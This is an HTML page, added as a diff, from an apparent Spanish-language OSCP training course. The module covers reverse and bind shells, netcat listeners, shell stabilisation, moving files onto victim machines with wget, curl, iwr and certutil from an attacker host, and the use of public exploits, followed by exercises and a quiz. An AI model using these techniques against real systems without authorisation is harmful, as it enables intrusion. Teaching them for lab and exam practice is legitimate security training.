@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="es"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Explotación y shells · OSCP Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css"><script src="assets/app.js" defer></script>
+</head>
+<body data-page="m08"><main>
+<div class="kicker">Módulo 8 · Nivel intermedio</div>
+<h1>Explotación y shells</h1>
+<p class="lead">Has encontrado un fallo. ¿Y ahora? Aquí entiendes qué es una “shell”, cómo se conectan atacante y víctima, cómo pasar archivos entre ellos y cómo usar exploits públicos con cabeza.</p>
+<div class="toc"><b>En este módulo</b><ol>
+<li><a href="#shell">¿Qué es una shell?</a></li>
+<li><a href="#bindrev">Bind shell vs reverse shell</a></li>
+<li><a href="#nc">Netcat: la navaja suiza</a></li>
+<li><a href="#tty">Estabilizar una shell</a></li>
+<li><a href="#transfer">Transferir archivos</a></li>
+<li><a href="#exploits">Exploits públicos y Metasploit</a></li>
+<li><a href="#practica">Prácticas y cuestionario</a></li>
+</ol></div>
+
+<h2 id="shell">1. ¿Qué es una shell?</h2>
+<div class="box def"><span class="t">Shell</span>Programa que recibe comandos y los ejecuta (bash, sh, cmd.exe, PowerShell). Cuando un pentester dice “tengo shell” significa que puede <b>ejecutar comandos en la máquina objetivo</b> de forma remota.</div>
+<div class="box analogy"><span class="t">Un walkie-talkie con la máquina</span>Conseguir shell es como dejar un walkie-talkie encendido dentro del edificio: tú hablas desde fuera y alguien dentro obedece. La “ejecución remota de código” (RCE) es poder decir <i>una</i> frase; la shell es la conversación completa.</div>
+
+<h2 id="bindrev">2. Bind shell vs reverse shell</h2>
+<figure class="diagram">
+<svg viewBox="0 0 760 300" role="img" aria-label="Bind shell frente a reverse shell">
+<defs><marker id="a8" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0L10,5L0,10z" fill="var(--fg2)"/></marker></defs>
+<text x="190" y="24" text-anchor="middle" font-weight="800">BIND SHELL</text>
+<rect class="b1" x="20" y="50" width="120" height="56" rx="10"/><text x="80" y="83" text-anchor="middle" font-weight="700">Atacante</text>
+<rect class="b5" x="240" y="50" width="120" height="56" rx="10"/><text x="300" y="76" text-anchor="middle" font-weight="700">Víctima</text><text x="300" y="94" text-anchor="middle" class="small">escucha :4444</text>
+<path class="ln flow" marker-end="url(#a8)" d="M140 78H238"/>
+<rect x="190" y="40" width="10" height="76" fill="var(--c3)" opacity=".8"/><text x="195" y="135" text-anchor="middle" class="small">firewall entrante</text><text x="195" y="150" text-anchor="middle" class="small" style="fill:var(--bad)">suele bloquear ✗</text>
+
+<text x="570" y="24" text-anchor="middle" font-weight="800">REVERSE SHELL</text>
+<rect class="b1" x="400" y="50" width="120" height="56" rx="10"/><text x="460" y="76" text-anchor="middle" font-weight="700">Atacante</text><text x="460" y="94" text-anchor="middle" class="small">escucha :443</text>
+<rect class="b5" x="620" y="50" width="120" height="56" rx="10"/><text x="680" y="83" text-anchor="middle" font-weight="700">Víctima</text>
+<path class="ln flow" marker-end="url(#a8)" d="M618 78H522"/>
+<rect x="570" y="40" width="10" height="76" fill="var(--c3)" opacity=".8"/><text x="575" y="135" text-anchor="middle" class="small">salida permitida</text><text x="575" y="150" text-anchor="middle" class="small" style="fill:var(--good)">suele pasar ✓</text>
+
+<text x="380" y="200" text-anchor="middle">Los firewalls suelen bloquear conexiones <tspan font-weight="700">entrantes</tspan> y permitir las <tspan font-weight="700">salientes</tspan>.</text>
+<text x="380" y="225" text-anchor="middle">Por eso la reverse shell es la más usada: la víctima “llama a casa”.</text>
+<text x="380" y="262" text-anchor="middle" class="small">Usa puertos que suelen estar permitidos en salida: 80, 443, 53…</text>
+</svg></figure>
+<div class="box analogy"><span class="t">El portero de la discoteca</span>Bind shell: tú intentas entrar en la discoteca (el portero te para). Reverse shell: alguien de dentro sale a la calle a hablar contigo (el portero deja salir a cualquiera).</div>
+
+<h2 id="nc">3. Netcat: la navaja suiza</h2>
+<p><code>nc</code> abre conexiones TCP/UDP “en crudo”. En tu Kali lo usarás sobre todo para <b>escuchar</b> la conexión de vuelta.</p>
+<pre>nc -lvnp 443      <span class="cm"># -l escuchar, -v detallado, -n sin DNS, -p puerto</span>
+nc -nv 10.10.10.5 25   <span class="cm"># conectar a un servicio y hablar con él a mano (banner grabbing)</span></pre>
+<div class="term" data-title="esperando la conexión de vuelta (lab)"><script type="text/plain">
+kali@kali:~$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.50.101] 51732
+$ whoami
+www-data
+$ hostname
+web01
+// La víctima ha "llamado a casa". Ya tienes ejecución de comandos como www-data.
+</script></div>
+<div class="tbl"><table>
+<tr><th>Herramienta</th><th>Uso</th></tr>
+<tr><td><code>nc</code> / <code>ncat</code></td><td>Escuchar o conectar</td></tr>
+<tr><td><code>rlwrap nc -lvnp 443</code></td><td>Igual, pero con historial y flechas (muy útil con Windows)</td></tr>
+<tr><td><code>socat</code></td><td>Como netcat pero más potente (shells totalmente interactivas, cifrado)</td></tr>
+<tr><td><code>penelope</code> / <code>pwncat-cs</code></td><td>Gestores de shells que estabilizan automáticamente</td></tr>
+</table></div>
+
+<h2 id="tty">4. Estabilizar una shell</h2>
+<p>Una shell recién obtenida es “tonta”: sin autocompletar, Ctrl+C la mata, no puedes usar <code>sudo</code> ni editores. Se arregla así (Linux):</p>
+<ol class="steps">
+<li>En la shell remota: <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></li>
+<li>Pulsa <kbd>Ctrl</kbd>+<kbd>Z</kbd> para dejarla en segundo plano.</li>
+<li>En tu Kali: <code>stty raw -echo; fg</code> y pulsa Enter.</li>
+<li>En la shell remota: <code>export TERM=xterm</code> y ajusta el tamaño con <code>stty rows 40 cols 160</code>.</li>
+</ol>
+<div class="box tip"><span class="t">Mejor aún: acceso “legítimo”</span>Si consigues credenciales o puedes escribir en <code>~/.ssh/authorized_keys</code> de un usuario, entra por <b>SSH</b> (Linux) o <b>WinRM/RDP</b> (Windows). Es estable y no se cae.</div>
+
+<h2 id="transfer">5. Transferir archivos</h2>
+<p>Necesitarás subir herramientas (scripts de enumeración) a la víctima y descargar pruebas a tu Kali.</p>
+<figure class="diagram">
+<svg viewBox="0 0 700 140" role="img" aria-label="Transferencia de archivos">
+<rect class="b1" x="20" y="40" width="200" height="60" rx="10"/><text x="120" y="66" text-anchor="middle" font-weight="700">Kali</text><text x="120" y="86" text-anchor="middle" class="small">python3 -m http.server 80</text>
+<rect class="b5" x="480" y="40" width="200" height="60" rx="10"/><text x="580" y="66" text-anchor="middle" font-weight="700">Víctima</text><text x="580" y="86" text-anchor="middle" class="small">wget / curl / iwr / certutil</text>
+<path class="ln flow" d="M220 70H478"/><text x="350" y="60" text-anchor="middle" class="small">GET /linpeas.sh</text>
+</svg></figure>
+<div class="tbl"><table>
+<tr><th>Desde</th><th>Comando en la víctima</th></tr>
+<tr><td>Linux</td><td><code>wget http://KALI/archivo -O /tmp/archivo</code> · <code>curl http://KALI/archivo -o /tmp/archivo</code></td></tr>
+<tr><td>Windows PowerShell</td><td><code>iwr http://KALI/archivo.exe -OutFile C:\Windows\Temp\archivo.exe</code></td></tr>
+<tr><td>Windows CMD</td><td><code>certutil -urlcache -split -f http://KALI/archivo.exe archivo.exe</code></td></tr>
+<tr><td>Windows vía SMB</td><td>En Kali: <code>impacket-smbserver share . -smb2support</code>; en Windows: <code>copy \\KALI\share\archivo.exe .</code></td></tr>
+<tr><td>Víctima → Kali</td><td>El mismo servidor SMB al revés, o <code>scp</code> si hay SSH</td></tr>
+</table></div>
+<div class="box tip"><span class="t">Dónde guardar</span>Linux: <code>/tmp</code> o <code>/dev/shm</code>. Windows: <code>C:\Windows\Temp</code>, <code>C:\Users\Public</code> o la carpeta del usuario. Comprueba que tienes permiso de escritura.</div>
+
+<h2 id="exploits">6. Exploits públicos y Metasploit</h2>
+<div class="tbl"><table>
+<tr><th>Fuente</th><th>Notas</th></tr>
+<tr><td>Exploit-DB / <code>searchsploit</code></td><td>Base de datos oficial de OffSec. <code>searchsploit -m ID</code> copia el exploit a tu carpeta</td></tr>
+<tr><td>GitHub</td><td>Muchas pruebas de concepto (PoC) de CVE recientes. Lee siempre el código</td></tr>
+<tr><td>Metasploit Framework</td><td>Plataforma con exploits, payloads y módulos auxiliares (<code>msfconsole</code>)</td></tr>
+<tr><td>msfvenom</td><td>Generador de payloads de Metasploit (ejecutables, scripts) para tus pruebas</td></tr>
+</table></div>
+<div class="box exam"><span class="t">Regla de Metasploit en el examen</span>Los módulos de explotación, auxiliares y post-explotación de Metasploit (y Meterpreter) solo se pueden usar en <b>una única máquina</b> del examen, la que elijas. Generar payloads con msfvenom y usar <code>multi/handler</code> para recibir conexiones está permitido en todas. Por eso debes saber explotar <b>manualmente</b>. Verifica la regla vigente en la guía oficial.</div>
+<h3>Flujo para usar un exploit público</h3>
+<ol class="steps">
+<li>Confirma la versión exacta del software (módulo 6).</li>
+<li>Encuentra el exploit y <b>lee la descripción</b>: requisitos, autenticación, versión.</li>
+<li>Copia el exploit, léelo entero y localiza qué debes cambiar (IP, puerto, rutas, credenciales).</li>
+<li>Prepara tu Kali (listener con <code>nc</code>, servidor web si el exploit descarga algo).</li>
+<li>Ejecútalo, observa errores, depura. Si no funciona, busca otra versión del exploit.</li>
+<li><b>Captura de pantalla</b> del comando y del resultado para el reporte.</li>
+</ol>
+<div class="box warn"><span class="t">Exploits de kernel y de memoria</span>Algunos exploits pueden colgar o reiniciar la máquina. En el examen puedes reiniciarlas desde el panel (con límite), pero úsalos como último recurso.</div>
+
+<h2 id="practica">Prácticas</h2>
+<details class="sol"><summary><span class="pill lv1">Fácil</span> ¿Bind o reverse?</summary>
+<p class="task">La víctima tiene un firewall que bloquea todo lo entrante salvo el puerto 80 (ocupado por la web), y permite salir por 443. ¿Qué tipo de shell elegirías y en qué puerto escucharías?</p>
+<p><b>Solución:</b> reverse shell, escuchando en tu Kali en el <b>443</b> (<code>sudo nc -lvnp 443</code>; con <code>sudo</code> porque los puertos &lt;1024 lo requieren).</p></details>
+<details class="sol"><summary><span class="pill lv1">Fácil</span> Banner grabbing</summary>
+<p class="task">Conéctate con netcat al puerto 22 de una máquina de tu lab. ¿Qué te devuelve?</p>
+<p><b>Solución:</b> una línea tipo <code>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5</code>: el servicio se presenta con su versión. Eso es “banner grabbing”.</p></details>
+<details class="sol"><summary><span class="pill lv2">Media</span> Pasar un archivo a Windows</summary>
+<p class="task">Tienes <code>winpeas.exe</code> en tu Kali (IP 192.168.45.200). Escribe los dos comandos (Kali y Windows PowerShell) para pasarlo a <code>C:\Windows\Temp</code>.</p>
+<pre><span class="cm"># Kali (en la carpeta donde está el archivo)</span>
+python3 -m http.server 80
+<span class="cm"># Windows</span>
+iwr http://192.168.45.200/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe</pre></details>
+<details class="sol"><summary><span class="pill lv3">Reto</span> El exploit no funciona</summary>
+<p class="task">Un exploit público en Python termina con <code>SyntaxError: Missing parentheses in call to 'print'</code>. Tras arreglarlo, se ejecuta pero no recibes conexión. Enumera 4 cosas a revisar.</p>
+<p><b>Solución:</b> (1) Era Python 2: corrígelo o ejecútalo con <code>python2</code>. (2) ¿Pusiste tu IP de <code>tun0</code> y no otra? (3) ¿Tu listener escucha en el mismo puerto que indica el exploit? (4) ¿El firewall de la víctima deja salir por ese puerto? Prueba 80/443. Extra: ¿la versión del objetivo es realmente la vulnerable? ¿Necesita una ruta o credenciales distintas?</p></details>
+
+<div class="quiz" data-id="q8"></div>
+<script>
+window.QUIZ = { q8: { title: "Cuestionario · Explotación y shells", qs: [
+ {q:"En una reverse shell, ¿quién inicia la conexión?", o:["El atacante","La víctima","El firewall","El DNS"], a:1, e:"La víctima se conecta al atacante."},
+ {q:"¿Por qué se prefiere la reverse shell?", o:["Es más rápida","Los firewalls suelen permitir conexiones salientes","Está cifrada","No necesita IP"], a:1, e:"El tráfico saliente suele estar permitido."},
+ {q:"¿Qué hace nc -lvnp 443?", o:["Escanea el puerto 443","Escucha conexiones en el 443","Descarga un archivo","Cierra el puerto"], a:1, e:"-l = listen."},
+ {q:"¿Qué comando levanta un servidor web en Kali para pasar archivos?", t:1, a:["python3 -m http.server"], e:"python3 -m http.server 80."},
+ {q:"¿En cuántas máquinas del examen puedes usar los módulos de explotación de Metasploit?", o:["Ninguna","Una","Dos","Todas"], a:1, e:"Solo en una."},
+ {q:"¿Qué herramienta busca exploits en Exploit-DB desde la terminal?", t:1, a:["searchsploit"], e:"searchsploit."},
+ {q:"Para hacer una shell interactiva en Linux usas…", o:["pty.spawn de Python + stty raw -echo","chmod 777","ping","nmap"], a:0, e:"Es la técnica clásica de estabilización."},
+ {q:"¿Qué carpeta de Windows suele ser escribible?", o:["C:\\Windows\\System32","C:\\Windows\\Temp","C:\\Program Files","C:\\Windows\\System32\\config"], a:1, e:"C:\\Windows\\Temp."},
+ {q:"RCE significa…", o:["Remote Code Execution","Root Control Engine","Reverse Connection Exploit","Remote Config Edit"], a:0, e:"Ejecución remota de código."},
+ {q:"Antes de ejecutar un exploit público conviene…", o:["Ejecutarlo tal cual","Leerlo y adaptar IP, puerto y rutas","Compilarlo como root","Subirlo a la víctima primero"], a:1, e:"Leer y adaptar siempre."},
+ {q:"¿Qué IP debes poner como LHOST en los labs?", o:["La de tu router","La de tu interfaz tun0 (VPN)","127.0.0.1","La de la víctima"], a:1, e:"Tu IP en la VPN (tun0)."}
+]}};
+</script>
+</main></body></html>
